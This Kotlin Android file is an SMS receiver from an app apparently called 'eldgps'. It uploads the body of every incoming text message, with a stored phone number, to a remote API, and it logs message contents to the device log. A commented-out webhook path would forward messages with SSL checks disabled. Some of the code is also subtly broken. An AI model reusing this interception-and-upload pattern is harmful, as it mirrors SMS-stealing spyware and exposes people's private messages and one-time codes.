package com.example.eldgps.callforwardingstatus.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import android.widget.Toast
import com.example.eldgps.helper.HelperUtils.BASE_URL
import com.example.eldgps.helper.REAL_NUMBER
import com.example.eldgps.helper.SharedPreferenceHelper
import com.example.eldgps.retrofit.Api
import com.example.eldgps.retrofit.MessageData
import com.example.eldgps.retrofit.RetrofitBuilder
import org.apache.commons.text.StringEscapeUtils
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.util.regex.Matcher


class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val WEBHOOK_BASE_URL = "http://192.168.29.159:8080/message/receive"
    }

    private lateinit var context: Context

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return

        this.context = context

        val bundle: Bundle? = intent.extras
        val pdus = bundle?.get("pdus") as? Array<Any> ?: return

        val content = StringBuilder()
        val messages = pdus.map { SmsMessage.createFromPdu(it as ByteArray) }
        messages.forEach { message ->
            val retrievedMessage = message.displayMessageBody.toString()
            Log.e("Mymessage", message.displayMessageBody.toString())

            // Post message to API
            var realNumber= SharedPreferenceHelper.getSharedPreference(context, REAL_NUMBER)
            val messageData = MessageData(realNumber, retrievedMessage)
            Log.e("Mymessage",messageData.toString())
            postMessageToApi(messageData)

            // Retrieve data from SharedPreferences
            val sharedPreferences = context.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)
            val telephone = sharedPreferences.getString("telephone", "0") ?: "0"
            Log.e("telephone", telephone)
        }

        Log.e("Mymessages", messages.first().originatingAddress ?: "")

            val sender = messages.first().originatingAddress ?: ""
        val pref = context.getSharedPreferences("receiver", Context.MODE_PRIVATE)
        val receiver = pref.getString("PHONE_NUMBER", "") ?: ""
        val messageContent = ForwardingConfig.getDefaultJsonTemplate()
            .replace("%from%", sender)
            .replace("%to%", receiver)
            .replace("%sentStamp%", messages.first().timestampMillis.toString())
            .replace("%receivedStamp%", System.currentTimeMillis().toString())
            .replace("%sim%", detectSim(bundle))
            .replace("%text%", Matcher.quoteReplacement(StringEscapeUtils.escapeJson(content.toString())))

      //  callWebHook(messageContent, ForwardingConfig.getDefaultJsonHeaders())
    }

    private fun postMessageToApi(messageData: MessageData) {
        val apiClient: Api = RetrofitBuilder.getApi(BASE_URL)
        apiClient.postMessage("application/json", messageData)?.enqueue(object : Callback<MessageData> {
            override fun onResponse(call: Call<MessageData>, response: Response<MessageData>) {
                if (response.isSuccessful) {
                    Log.e("ApiSuccess", "Message posted successfully")
                    Toast.makeText(context,"Message sent",Toast.LENGTH_SHORT).show()
                } else {
                    Log.e("ApiFailure", "Error: ${response.errorBody()}")
                    Toast.makeText(context,"Got error",Toast.LENGTH_SHORT).show()
                }
            }

            override fun onFailure(call: Call<MessageData>, t: Throwable) {
                Log.e("ApiFailure", "Failed to post message: ${t.message}")
                Toast.makeText(context,"Unable to send message",Toast.LENGTH_SHORT).show()
            }
        })
    }

/*
    protected fun callWebHook(message: String?, headers: String?) {
        val constraints: Constraints = Data.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()


        val data: Data = Builder()
            .putString(WebHookWorkRequest.DATA_URL, WEBHOOK_BASE_URL)
            .putString(WebHookWorkRequest.DATA_TEXT, message)
            .putString(WebHookWorkRequest.DATA_HEADERS, headers)
            .putBoolean(WebHookWorkRequest.DATA_IGNORE_SSL, true)
            .build()


        val webhookWorkRequest: WorkRequest =
            Builder(WebHookWorkRequest::class.java)
                .setConstraints(constraints)
                .setBackoffCriteria(
                    BackoffPolicy.EXPONENTIAL,
                    WorkRequest.MIN_BACKOFF_MILLIS,
                    TimeUnit.MILLISECONDS
                )
                .setInputData(data)
                .build()


        WorkManager
            .getInstance(this.context)
            .enqueue(webhookWorkRequest)
    }
*/


    private fun detectSim(bundle: Bundle): String {
        val keySet = bundle.keySet()
        var slotId = -1

        keySet.forEach { key ->
            val lowerKey = key.lowercase()
            slotId = when (key) {
                "phone", "slot", "simId", "simSlot", "slot_id", "simnum", "slotId", "slotIdx", "android.telephony.extra.SLOT_INDEX" -> bundle.getInt(key, -1)
                else -> if (lowerKey.contains("slot") || lowerKey.contains("sim")) {
                    bundle.getString(key, "-1")?.toIntOrNull() ?: -1
                } else {
                    -1
                }
            }
            if (slotId != -1) return@forEach
        }

        return when (slotId) {
            0 -> "sim1"
            1 -> "sim2"
            else -> "undetected"
        }
    }
}
